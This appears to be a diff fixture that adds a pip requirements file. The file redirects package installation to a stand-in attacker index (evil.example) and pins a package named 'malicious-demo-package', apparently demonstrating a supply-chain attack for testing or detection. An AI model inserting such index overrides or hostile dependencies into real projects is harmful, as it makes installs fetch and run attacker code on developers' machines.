@@ -1,0 +1,3 @@
+--index-url https://evil.example/simple
+requests>=2
+malicious-demo-package==1.0.0
